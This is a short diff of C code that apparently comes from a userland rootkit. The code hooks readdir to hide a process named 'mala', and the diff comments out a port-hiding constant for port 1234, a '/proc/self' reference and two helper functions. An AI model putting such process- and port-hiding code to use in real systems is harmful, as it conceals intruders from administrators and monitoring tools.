@@ -15,13 +15,15 @@ static const char* process_to_filter3 = "mala";
 
 /*
  * Port to hide
- */
+ 
 static const char* port_to_filter = ":04D2";
+*/
 
 /*
  * /Proc/self
- */
+ 
 static const char* proc_self = "/proc/self";
+*/
 
 /*
  * Get a directory name given a DIR* handle
@@ -130,7 +132,7 @@ DECLARE_READDIR(dirent, readdir);
 
 
 
-static int get_process_pid(char* buf, size_t size)
+/*static int get_process_pid(char* buf, size_t size)
 {
 
     ssize_t ret = readlink(proc_self, buf, size);
@@ -140,10 +142,10 @@ static int get_process_pid(char* buf, size_t size)
     buf[ret] = 0;
     return 1;
 
-}
+}*/
 
 
-static int get_file_name(int fd, char* buf, size_t size)
+/*static int get_file_name(int fd, char* buf, size_t size)
 {
     if(fd == -1) {
         return 0;
@@ -158,7 +160,7 @@ static int get_file_name(int fd, char* buf, size_t size)
 
     buf[ret] = 0;
     return 1;
-}
+}*/
 
 /*static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
 
